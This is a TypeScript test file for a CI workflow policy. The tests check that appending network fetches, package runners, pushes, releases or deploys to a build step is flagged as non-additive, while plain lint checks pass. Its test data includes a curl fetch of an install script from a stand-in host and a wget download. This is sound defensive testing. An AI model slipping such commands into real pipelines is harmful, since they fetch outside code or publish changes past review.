import { expect, test } from "bun:test";
import { workflowEdit } from "@/packages/workit-core/src/core/policy/workflow-edit";

// #891 review: "additive" is a shape rule, so a sealed additiveRiskPaths would
// let any appended command skip review. Commands that reach past the job (a
// network fetch, a package runner, a push, a release or a deploy) are refused.

const CI = `name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm run build
`;
const append = (tail: string) =>
  workflowEdit(CI, CI.replace("npm run build", `npm run build${tail}`));

test("Given an appended command that reaches past the job, Then the edit is not additive and names it", () => {
  for (const [tail, word] of [
    [" && curl -fsS https://x.example/install.sh", "curl"],
    [" && wget https://x.example/a", "wget"],
    [" && npx -y some-pkg", "npx"],
    [" && bunx some-pkg", "bunx"],
    [" && pnpm dlx some-pkg", "dlx"],
    [" && git push origin HEAD", "push"],
    [" && gh release create v1", "gh"],
    [" && npm publish", "publish"],
    [' && (npm run deploy || echo "deploy failed")', "deploy"],
  ] as const) {
    const read = append(tail);
    expect([tail, read.additive, read.detail]).toEqual([
      tail,
      false,
      `appends the effectful command ${word} to jobs.build.steps[0].run`,
    ]);
  }
});

test("Given a plain appended check, Then it stays additive", () => {
  expect(append(' && (npm run tidy:check || echo "::warning::tidy")').additive).toBe(true);
  expect(append(" && npm run lint").additive).toBe(true);
});
